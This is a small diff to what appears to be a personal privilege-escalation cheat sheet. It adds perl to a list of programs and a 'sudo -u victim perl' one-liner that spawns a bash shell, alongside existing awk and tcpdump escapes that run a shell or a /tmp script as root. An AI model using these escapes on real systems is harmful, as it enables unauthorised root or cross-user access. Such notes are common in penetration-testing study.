@@ -40,6 +40,7 @@ Programs:
 - cp
 - tcpdump
 - awk
+- perl
 
 NMAP
 - nmap -V (version 4.53)
@@ -92,6 +93,9 @@ awk 'BEGIN {system("/bin/bash")}'
 TCPDUMP
 - tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root”
 - we have to put commands into /tmp/.test
+
+PERL
+- sudo -u victim perl -e 'system("/bin/bash")
 
 5. SUDO users
 - /etc/sudoers
